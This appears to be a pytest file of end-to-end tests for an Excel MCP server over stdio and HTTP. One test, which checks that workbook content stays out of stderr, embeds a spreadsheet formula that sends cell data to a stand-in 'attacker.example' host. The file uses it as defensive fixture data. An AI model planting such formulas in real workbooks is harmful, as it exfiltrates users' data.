"""End-to-end runs of the real command over stdio and Streamable HTTP."""

import socket
import subprocess
import sys
import time
import zipfile
from pathlib import Path

import pytest
from mcp import Client, ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client
from openpyxl import Workbook

pytestmark = pytest.mark.anyio


async def test_stdio(tmp_path: Path) -> None:
    params = StdioServerParameters(
        command=sys.executable,
        args=["-m", "excel_mcp", "stdio", "--allow-dir", str(tmp_path)],
    )
    async with Client(params) as client:
        result = await client.call_tool("create_workbook", {"path": "stdio.xlsx"})
        assert not result.is_error
    assert (tmp_path / "stdio.xlsx").is_file()


async def test_stdio_keeps_workbook_content_out_of_stderr(tmp_path: Path) -> None:
    secret = 'WEBSERVICE("https://attacker.example/?d="&amp;A1)'
    _write_workbook_with_print_area(tmp_path / "leak.xlsx", secret)
    params = StdioServerParameters(
        command=sys.executable,
        args=["-m", "excel_mcp", "stdio", "--allow-dir", str(tmp_path)],
    )
    with (tmp_path / "stderr.txt").open("w+") as errlog:
        async with stdio_client(params, errlog) as streams, ClientSession(*streams) as session:
            await session.initialize()
            result = await session.call_tool("describe_workbook", {"path": "leak.xlsx"})
            assert not result.is_error
        errlog.seek(0)
        assert "attacker.example" not in errlog.read()


def _write_workbook_with_print_area(path: Path, print_area: str) -> None:
    """openpyxl warns, quoting the name, when a print area is not a cell range."""
    Workbook().save(path)
    with zipfile.ZipFile(path) as source:
        parts = {name: source.read(name) for name in source.namelist()}
    defined_name = (
        f'<definedNames><definedName name="_xlnm.Print_Area" localSheetId="0">'
        f"{print_area}</definedName></definedNames>"
    )
    parts["xl/workbook.xml"] = parts["xl/workbook.xml"].replace(
        b"<definedNames />", defined_name.encode()
    )
    with zipfile.ZipFile(path, "w") as target:
        for name, data in parts.items():
            target.writestr(name, data)


def _free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


async def test_streamable_http(tmp_path: Path) -> None:
    port = _free_port()
    process = subprocess.Popen(
        [
            sys.executable,
            "-m",
            "excel_mcp",
            "streamable-http",
            "--port",
            str(port),
            "--allow-dir",
            str(tmp_path),
        ]
    )
    try:
        _wait_for_port(port)
        async with Client(f"http://127.0.0.1:{port}/mcp") as client:
            result = await client.call_tool("create_workbook", {"path": "http.xlsx"})
            assert not result.is_error
    finally:
        process.terminate()
        process.wait(timeout=10)
    assert (tmp_path / "http.xlsx").is_file()


def _wait_for_port(port: int) -> None:
    deadline = time.monotonic() + 20
    while time.monotonic() < deadline:
        with socket.socket() as sock:
            if sock.connect_ex(("127.0.0.1", port)) == 0:
                return
        time.sleep(0.1)
    raise TimeoutError(f"Server did not start on port {port}.")
